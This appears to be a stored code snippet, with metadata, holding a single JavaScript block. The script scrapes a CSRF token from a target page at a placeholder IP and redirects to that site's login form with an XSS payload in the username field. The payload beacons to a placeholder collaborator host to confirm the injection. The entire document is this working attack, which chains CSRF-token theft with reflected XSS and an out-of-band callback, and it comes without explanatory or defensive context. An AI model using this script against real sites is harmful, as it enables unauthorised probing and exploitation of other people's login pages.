---
id: d1b2a216-af65-42e3-9efb-894ed541850b
type: code
language: ''
verified: false
created_at: '2020-08-17T07:52:51.684653+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet d1b2a216

```
<script>
function xss(url, text, vector) {
  location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url, collaboratorURL){
  fetch(url).then(r=>r.text().then(text=>
  {
    xss(url, text, '"><img src='+collaboratorURL+'?foundXSS=1>');
  }
  ))
}

fetchUrl("http://$ip", "http://$collaboratorPayload");
</script>
```
